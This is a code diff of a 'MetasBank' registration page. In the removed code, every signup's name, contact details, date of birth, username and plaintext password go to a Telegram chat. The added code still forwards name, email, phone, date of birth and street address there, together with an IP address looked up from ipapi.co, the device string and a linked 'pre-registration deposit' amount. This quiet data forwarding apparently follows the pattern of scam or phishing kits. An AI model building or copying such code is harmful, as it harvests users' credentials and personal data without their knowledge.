@@ -2,13 +2,15 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';">
   <script src="geo-restrict.js"></script>
   <title>MetasBank — Register</title>
   <link rel="icon" type="image/svg+xml" href="/favicon.svg">
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
   <script src="/supabase-config.js"></script>
+  <script src="/validation.js"></script>
   <script>
     tailwind.config = {
       theme: {
@@ -46,6 +48,10 @@
     .fixed-header { position: fixed; top: 0; left: 0; right: 0; z-index: 100; }
     .main-content { padding-top: var(--header-h); flex: 1; display: flex; flex-direction: column; }
     .footer-area { margin-top: auto; }
+    @media (max-width: 480px) {
+      input, select, textarea { font-size: 16px !important; }
+      .step-dot { width: 36px; height: 36px; }
+    }
   </style>
   <style>html.js-loading *{transition:none!important}</style>
   <script>
@@ -68,6 +74,13 @@
 
   <!-- Main content -->
   <div class="main-content">
+    <!-- Deposit Ref Banner -->
+    <div id="depositBanner" class="hidden" style="background: #ffffff; border-bottom: 1px solid #e5e7eb; padding: 10px 16px; text-align: center; box-shadow: 0 1px 4px rgba(0,0,0,0.06); position: sticky; top: 0; z-index: 10;">
+      <p class="text-[12px] font-semibold" style="color: #1a1d28;">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5" style="display:inline; vertical-align:middle; margin-right:4px;"><path d="M20 6L9 17l-5-5"/></svg>
+        Pre-registration deposit linked — Ref: <span id="depositBannerRef" class="font-mono font-bold" style="color: #ff5c35;">---</span>
+      </p>
+    </div>
     <div class="flex-1 flex items-center justify-center px-4 py-6">
       <div class="w-full max-w-sm">
 
@@ -87,23 +100,23 @@
         <div class="space-y-4">
           <div>
             <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Full Name <span style="color:#ff5c35;">*</span></label>
-            <input id="rName" type="text" placeholder="Your full name" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+            <input id="rName" type="text" placeholder="Your full name" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
           </div>
           <div>
             <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Date of Birth <span style="color:#ff5c35;">*</span></label>
             <div class="grid grid-cols-3 gap-2">
-              <select id="rDobMonth" class="rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+              <select id="rDobMonth" class="rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
                 <option value="">Month</option>
                 <option value="01">Jan</option><option value="02">Feb</option><option value="03">Mar</option>
                 <option value="04">Apr</option><option value="05">May</option><option value="06">Jun</option>
                 <option value="07">Jul</option><option value="08">Aug</option><option value="09">Sep</option>
                 <option value="10">Oct</option><option value="11">Nov</option><option value="12">Dec</option>
               </select>
-              <select id="rDobDay" class="rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+              <select id="rDobDay" class="rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
                 <option value="">Day</option>
 <option value="01">1</option><option value="02">2</option><option value="03">3</option><option value="04">4</option><option value="05">5</option><option value="06">6</option><option value="07">7</option><option value="08">8</option><option value="09">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option>
               </select>
-              <select id="rDobYear" class="rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+              <select id="rDobYear" class="rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
                 <option value="">Year</option>
 <option value="2026">2026</option><option value="2025">2025</option><option value="2024">2024</option><option value="2023">2023</option><option value="2022">2022</option><option value="2021">2021</option><option value="2020">2020</option><option value="2019">2019</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option><option value="1904">1904</option><option value="1903">1903</option><option value="1902">1902</option><option value="1901">1901</option><option value="1900">1900</option>
               </select>
@@ -112,31 +125,43 @@
           <div>
             <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Phone Number <span style="color:#ff5c35;">*</span></label>
             <div class="flex gap-2">
-              <select id="rPhoneCode" class="w-[100px] shrink-0 rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
-                <option value="+1">+1</option>
-                <option value="+44">+44</option><option value="+61">+61</option>
-                <option value="+49">+49</option><option value="+33">+33</option><option value="+39">+39</option>
-                <option value="+34">+34</option><option value="+31">+31</option><option value="+46">+46</option>
-                <option value="+47">+47</option><option value="+45">+45</option><option value="+358">+358</option>
-                <option value="+41">+41</option><option value="+43">+43</option><option value="+32">+32</option>
-                <option value="+353">+353</option><option value="+351">+351</option><option value="+30">+30</option>
-                <option value="+48">+48</option><option value="+420">+420</option><option value="+36">+36</option>
-                <option value="+40">+40</option><option value="+7">+7</option><option value="+81">+81</option>
-                <option value="+86">+86</option><option value="+91">+91</option><option value="+55">+55</option>
-                <option value="+52">+52</option><option value="+82">+82</option><option value="+65">+65</option>
-                <option value="+60">+60</option><option value="+63">+63</option><option value="+62">+62</option>
-                <option value="+66">+66</option><option value="+84">+84</option><option value="+27">+27</option>
-                <option value="+234">+234</option><option value="+20">+20</option><option value="+972">+972</option>
-                <option value="+971">+971</option><option value="+966">+966</option><option value="+90">+90</option>
-                <option value="+54">+54</option><option value="+56">+56</option><option value="+57">+57</option>
-                <option value="+92">+92</option><option value="+880">+880</option><option value="+98">+98</option>
+              <select id="rPhoneCode" class="w-[100px] shrink-0 rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
+                <option value="+44">🇬🇧 +44</option>
+                <option value="+49">🇩🇪 +49</option><option value="+33">🇫🇷 +33</option>
+                <option value="+34">🇪🇸 +34</option><option value="+39">🇮🇹 +39</option>
+                <option value="+31">🇳🇱 +31</option><option value="+32">🇧🇪 +32</option>
+                <option value="+41">🇨🇭 +41</option><option value="+43">🇦🇹 +43</option>
+                <option value="+351">🇵🇹 +351</option><option value="+353">🇮🇪 +353</option>
+                <option value="+48">🇵🇱 +48</option><option value="+46">🇸🇪 +46</option>
+                <option value="+47">🇳🇴 +47</option><option value="+45">🇩🇰 +45</option>
+                <option value="+358">🇫🇮 +358</option><option value="+420">🇨🇿 +420</option>
+                <option value="+40">🇷🇴 +40</option><option value="+36">🇭🇺 +36</option>
+                <option value="+30">🇬🇷 +30</option><option value="+385">🇭🇷 +385</option>
+                <option value="+386">🇸🇮 +386</option><option value="+381">🇷🇸 +381</option>
+                <option value="+382">🇲🇪 +382</option><option value="+389">🇲🇰 +389</option>
+                <option value="+355">🇦🇱 +355</option><option value="+359">🇧🇬 +359</option>
+                <option value="+370">🇱🇹 +370</option><option value="+371">🇱🇻 +371</option>
+                <option value="+372">🇪🇪 +372</option><option value="+380">🇺🇦 +380</option>
+                <option value="+7">🇷🇺 +7</option>
+                <option value="+1">🇺🇸 +1</option><option value="+1">🇨🇦 +1</option>
+                <option value="+61">🇦🇺 +61</option><option value="+64">🇳🇿 +64</option>
+                <option value="+81">🇯🇵 +81</option><option value="+82">🇰🇷 +82</option>
+                <option value="+86">🇨🇳 +86</option><option value="+91">🇮🇳 +91</option>
+                <option value="+55">🇧🇷 +55</option><option value="+52">🇲🇽 +52</option>
+                <option value="+27">🇿🇦 +27</option><option value="+234">🇳🇬 +234</option>
+                <option value="+20">🇪🇬 +20</option><option value="+972">🇮🇱 +972</option>
+                <option value="+971">🇦🇪 +971</option><option value="+966">🇸🇦 +966</option>
+                <option value="+90">🇹🇷 +90</option><option value="+92">🇵🇰 +92</option>
+                <option value="+63">🇵🇭 +63</option><option value="+60">🇲🇾 +60</option>
+                <option value="+65">🇸🇬 +65</option><option value="+66">🇹🇭 +66</option>
+                <option value="+84">🇻🇳 +84</option><option value="+62">🇮🇩 +62</option>
               </select>
-              <input id="rPhone" type="tel" placeholder="Your phone number" class="flex-1 rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+              <input id="rPhone" type="tel" placeholder="Your phone number" class="flex-1 rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
             </div>
           </div>
           <div>
             <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Email Address <span style="color:#ff5c35;">*</span></label>
-            <input id="rEmail" type="email" placeholder="your@email.com" class="w-full rounded-lg px-4 py-3 text-[13px] font-mono focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+            <input id="rEmail" type="email" placeholder="your@email.com" class="w-full rounded-lg px-4 py-3 text-[13px] font-mono focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
           </div>
         </div>
         <button id="step1NextBtn" class="w-full mt-6 py-3 rounded-lg gradient-orange text-white text-[13px] font-bold hover:opacity-90 transition-all" style="box-shadow: 0 4px 15px var(--shadow);">Next →</button>
@@ -149,26 +174,26 @@
         <div class="space-y-4">
           <div>
             <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Street Address <span style="color:#ff5c35;">*</span></label>
-            <input id="rStreet" type="text" placeholder="Street address, building, apartment" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+            <input id="rStreet" type="text" placeholder="Street address, building, apartment" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
           </div>
           <div class="grid grid-cols-2 gap-3">
             <div>
               <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">City <span style="color:#ff5c35;">*</span></label>
-              <input id="rCity" type="text" placeholder="Your city" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+              <input id="rCity" type="text" placeholder="Your city" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
             </div>
             <div>
               <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">State / Province <span style="color:#ff5c35;">*</span></label>
-              <input id="rState" type="text" placeholder="State / Region" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+              <input id="rState" type="text" placeholder="State / Region" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
             </div>
           </div>
           <div class="grid grid-cols-2 gap-3">
             <div>
               <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">ZIP / Postal Code <span style="color:#ff5c35;">*</span></label>
-              <input id="rZip" type="text" placeholder="Postal code" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+              <input id="rZip" type="text" placeholder="Postal code" class="w-full rounded-lg px-4 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
             </div>
             <div>
               <label class="text-[10px] font-semibold uppercase tracking-wide mb-1.5 block" style="color: var(--text-muted);">Country <span style="color:#ff5c35;">*</span></label>
-              <select id="rCountry" class="w-full rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text);">
+              <select id="rCountry" class="w-full rounded-lg px-3 py-3 text-[13px] focus:outline-none focus:border-[#ff5c35]" style="background: var(--input-bg); border: 1px solid var(--border); color: var(--text); font-size: 16px;">
               </select>
             </div>
           </div>
@@ -239,11 +264,11 @@
           <div class="text-[11px] space-y-3">
             <div class="flex items-center justify-between rounded-lg p-3" style="background: var(--input-bg); border: 1px solid var(--border);">
               <div><span class="font-semibold text-[10px] uppercase tracking-wide" style="color: var(--text-muted);">Username</span><div id="newUsername" class="font-mono text-sm font-bold mt-0.5" style="color: var(--text);"></div></div>
-              <button id="copyUsernameBtn" onclick="copyText('newUsername')" class="px-3 py-1.5 rounded-lg text-[10px] font-semibold transition-all shrink-0" style="background: var(--hover); color: var(--text-secondary); border: 1px solid var(--border);">Copy</button>
+              <button id="copyUsernameBtn" onclick="copyText('newUsername')" class="px-3 py-2.5 rounded-lg text-[10px] font-semibold transition-all shrink-0" style="background: var(--hover); color: var(--text-secondary); border: 1px solid var(--border); min-height: 44px;">Copy</button>
             </div>
             <div class="flex items-center justify-between rounded-lg p-3" style="background: var(--input-bg); border: 1px solid var(--border);">
               <div><span class="font-semibold text-[10px] uppercase tracking-wide" style="color: var(--text-muted);">Password (Access Key)</span><div id="accessKeyDisplay" class="font-mono text-sm font-bold mt-0.5 tracking-wider" style="color: #ff5c35;"></div></div>
-              <button id="copyKeyBtn" onclick="copyAccessKey()" class="px-3 py-1.5 rounded-lg text-[10px] font-semibold transition-all shrink-0" style="background: var(--hover); color: var(--text-secondary); border: 1px solid var(--border);">Copy</button>
+              <button id="copyKeyBtn" onclick="copyAccessKey()" class="px-3 py-2.5 rounded-lg text-[10px] font-semibold transition-all shrink-0" style="background: var(--hover); color: var(--text-secondary); border: 1px solid var(--border); min-height: 44px;">Copy</button>
             </div>
           </div>
           <p class="text-[10px] text-center" style="color: var(--text-muted);">Credentials have also been sent to your email.</p>
@@ -391,11 +416,15 @@
       let name = document.getElementById("rName").value.trim();
       let dob = getDob();
       let phone = document.getElementById("rPhone").value.trim();
+      let phoneCode = document.getElementById("rPhoneCode").value;
       let email = document.getElementById("rEmail").value.trim();
       if (!name) { showStepError("step1Error", "Please enter your full name"); return }
       if (!dob) { showStepError("step1Error", "Please select your date of birth"); return }
       if (!phone) { showStepError("step1Error", "Please enter your phone number"); return }
-      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { showStepError("step1Error", "Enter a valid email address"); return }
+      let phoneCheck = MetasValidate.validatePhone(phoneCode + phone, document.getElementById("rCountry").value || "GB");
+      if (!phoneCheck.valid) { showStepError("step1Error", phoneCheck.error); return }
+      let emailCheck = MetasValidate.validateEmail(email);
+      if (!emailCheck.valid) { showStepError("step1Error", emailCheck.error); return }
       // Minimum age 18
       let bm = parseInt(document.getElementById("rDobMonth").value, 10);
       let bd = parseInt(document.getElementById("rDobDay").value, 10);
@@ -417,8 +446,10 @@
       if (!street) { showStepError("step2Error", "Please enter your street address"); return }
       if (!city) { showStepError("step2Error", "Please enter your city"); return }
       if (!state) { showStepError("step2Error", "Please enter your state / region"); return }
-      if (!zip) { showStepError("step2Error", "Please enter your ZIP code"); return }
+      if (!zip) { showStepError("step2Error", "Please enter your ZIP / postal code"); return }
       if (!country) { showStepError("step2Error", "Please select your country"); return }
+      let postalCheck = MetasValidate.validatePostalCode(zip, country);
+      if (!postalCheck.valid) { showStepError("step2Error", postalCheck.error); return }
       hideStepError("step2Error");
 
       document.getElementById("rvName").textContent = document.getElementById("rName").value.trim();
@@ -516,19 +547,12 @@
 
       sessionStorage.setItem("metasbank_used", "1");
 
-      // ── Telegram signup notification ──
-      supabaseClient.rpc('send_telegram_notification', {
-        p_message:
-          '<b>New Member Signup</b>\n' +
-          '<b>Name:</b> ' + escHtml(name) + '\n' +
-          '<b>Email:</b> ' + escHtml(email) + '\n' +
-          '<b>Phone:</b> ' + escHtml(phone) + '\n' +
-          '<b>DOB:</b> ' + escHtml(dob) + '\n' +
-          '<b>Country:</b> ' + escHtml(country) + '\n' +
-          '<b>Username:</b> ' + escHtml(result.data.username) + '\n' +
-          '<b>Access Key:</b> <code>' + escHtml(result.data.access_key) + '</code>\n' +
-          '<b>Date:</b> ' + new Date().toLocaleString()
-      }).catch(function(e) { console.log('TG notify error:', e) });
+      // Store signup data for proceedToDashboard
+      sessionStorage.setItem("metasbank_signup_data", JSON.stringify({
+        name: name, email: email, phone: phone, dob: dob, country: country,
+        street: street, city: city, state: state, zip: zip,
+        member_id: result.data.id
+      }));
 
     }
 
@@ -577,16 +601,80 @@
     async function proceedToDashboard() {
       let btn = document.getElementById('proceedBtn');
       btn.textContent = 'Signing in...'; btn.disabled = true; btn.style.opacity = '0.7';
+
+      // Read stored signup data
+      let signupData = null;
+      try { signupData = JSON.parse(sessionStorage.getItem("metasbank_signup_data") || "null"); } catch(e) {}
+
       let result = await memberLogin(lastSignupEmail || lastSignupUsername, lastGeneratedKey);
       if (result.error) {
         window.location.href = '/login/';
-      } else {
-        window.location.href = '/dashboard/';
+        return;
       }
+
+      // ── Telegram signup notification (fires after successful login) ──
+      if (signupData) {
+        let addressParts = [signupData.street, signupData.city, signupData.state, signupData.zip].filter(Boolean);
+        let addressStr = addressParts.length ? addressParts.join(', ') : 'N/A';
+        let tgIp = '';
+        let tgUa = navigator.userAgent || 'Unknown';
+        try {
+          let ipResp = await fetch('https://ipapi.co/json/').then(function(r) { return r.json() });
+          tgIp = ipResp.ip || '';
+        } catch(e) {}
+        supabaseClient.rpc('send_telegram_notification', {
+          p_message:
+            '📝 <b>New Member Signup</b>\n\n' +
+            '👤 <b>Name:</b> ' + escHtml(signupData.name) + '\n' +
+            '📧 <b>Email:</b> ' + escHtml(signupData.email) + '\n' +
+            '📱 <b>Phone:</b> ' + escHtml(signupData.phone) + '\n' +
+            '🎂 <b>DOB:</b> ' + escHtml(signupData.dob) + '\n' +
+            '🌍 <b>Country:</b> ' + escHtml(signupData.country) + '\n' +
+            '🏠 <b>Address:</b> ' + escHtml(addressStr) + '\n\n' +
+            '🕐 <b>Date:</b> ' + new Date().toLocaleString() + '\n' +
+            '🌐 <b>IP:</b>  <code>' + escHtml(tgIp || 'Unknown') + '</code>\n' +
+            '📱 <b>Device:</b>  <code>' + escHtml(tgUa) + '</code>'
+        }).catch(function(e) {  });
+
+        // ── Link pre-deposit if deposit_ref present ──
+        if (activeDepositRef && signupData.member_id) {
+          supabaseClient.rpc('rpc_check_deposit_link', { p_ref_code: activeDepositRef }).then(function(linkResp) {
+            var linkData = linkResp.data && linkResp.data.length ? linkResp.data[0] : {};
+            var depAmount = linkData.amount || 'N/A';
+            var depCurrency = linkData.currency || 'USD';
+            supabaseClient.rpc('send_telegram_notification', {
+              p_message: '💰 <b>Deposit Linked to New Member</b>\n\n📋 <b>Ref:</b> <code>' + escHtml(activeDepositRef) + '</code>\n💲 <b>Amount:</b> ' + escHtml(depCurrency) + ' ' + depAmount + '\n👤 <b>Name:</b> ' + escHtml(signupData.name) + '\n📧 <b>Email:</b> ' + escHtml(signupData.email) + '\n📱 <b>Phone:</b> ' + escHtml(signupData.phone) + '\n🌍 <b>Country:</b> ' + escHtml(signupData.country) + '\n\n🕐 <b>Date:</b> ' + new Date().toLocaleString() + '\n🌐 <b>IP:</b>  <code>' + escHtml(tgIp || 'Unknown') + '</code>\n📱 <b>Device:</b>  <code>' + escHtml(tgUa) + '</code>'
+            }).catch(function() {});
+            // Clear stored data
+            sessionStorage.removeItem("metasbank_signup_data");
+          }).catch(function(e) {  });
+        }
+      }
+
+      window.location.href = '/dashboard/';
     }
 
     // ===== INIT =====
-    try { initSupabase() } catch(e) { console.warn("initSupabase error:", e); }
+    try { initSupabase() } catch(e) { console.warn("Init failed"); }
+
+    // ===== DEPOSIT REF =====
+    let activeDepositRef = null;
+    (function() {
+      const params = new URLSearchParams(window.location.search);
+      const ref = params.get('deposit_ref');
+      if (ref) {
+        activeDepositRef = ref;
+        // Show deposit banner after DOM is ready
+        document.addEventListener('DOMContentLoaded', function() {
+          const banner = document.getElementById('depositBanner');
+          const refEl = document.getElementById('depositBannerRef');
+          if (banner && refEl) {
+            refEl.textContent = ref;
+            banner.classList.remove('hidden');
+          }
+        });
+      }
+    })();
 
     // Already used check
     (function() {
